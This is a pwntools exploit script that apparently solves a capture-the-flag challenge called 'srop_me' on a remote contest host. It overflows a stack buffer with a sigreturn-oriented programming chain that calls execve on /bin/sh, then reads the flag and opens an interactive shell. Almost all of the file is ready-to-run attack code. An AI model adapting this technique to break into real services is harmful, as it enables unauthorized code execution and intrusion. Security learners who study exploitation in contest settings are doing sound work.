#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.n00bzunit3d.xyz --port 38894 srop_me
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('srop_me')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.n00bzunit3d.xyz'
port = int(args.PORT or 38894)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
br vuln
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)

io = start()

binsh = next(exe.search(b"/bin/sh\x00")) # /bin/sh is present in the binary
syscall_ret = ROP(exe).find_gadget(['syscall', 'ret'])[0] # syscall gadget

frame = SigreturnFrame()
frame.rax = 59          # syscall code for execve
frame.rdi = binsh       # path
frame.rsi = 0           # args
frame.rdx = 0           # env
frame.rip = syscall_ret # syscall gadget to call execve

rop  = p64(exe.symbols['vuln']) # so that we read from stdin and store the number of bytes read to eax
rop += p64(syscall_ret)         # call sigreturn ()
rop += bytes(frame)             # frame used by sigreturn

io.recvuntil("!!\n")
io.sendline(b"a" * 32 + rop)

io.recvuntil("!!\n")
io.sendline(b"a"*14) #  15 bytes read -> rax=15 (code for sigreturn) when returning from vuln the 2nd time

io.sendline(b"cat flag")
io.interactive()